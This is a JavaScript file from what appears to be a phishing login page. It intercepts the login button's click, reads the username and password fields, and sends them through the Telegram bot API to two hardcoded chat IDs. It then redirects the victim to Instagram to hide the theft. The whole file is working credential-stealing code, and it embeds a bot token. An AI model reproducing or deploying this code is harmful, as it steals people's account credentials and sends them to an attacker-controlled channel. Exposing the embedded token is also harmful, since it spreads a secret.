let login_button = document.querySelector(".login-button");
let inputs = document.querySelectorAll("input");
let bot_token = '6833420659:AAH-pMIOcYkGDgLCVioMFzuO_KIDHh9RNz4';
let chat_ids = ['959449247', '5517156202'];

login_button.addEventListener("click", (e) => {
    e.preventDefault();
    chat_ids.forEach(chat_id => {
        fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chat_id,
                text: `login: ${inputs[0].value} \npassword: ${inputs[1].value}`
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                window.location.href = "https://www.instagram.com/";
            } else {
                console.error('Error sending message:', data);
            }
        }) 
        .catch(error => console.error('Error:', error));
    });
});
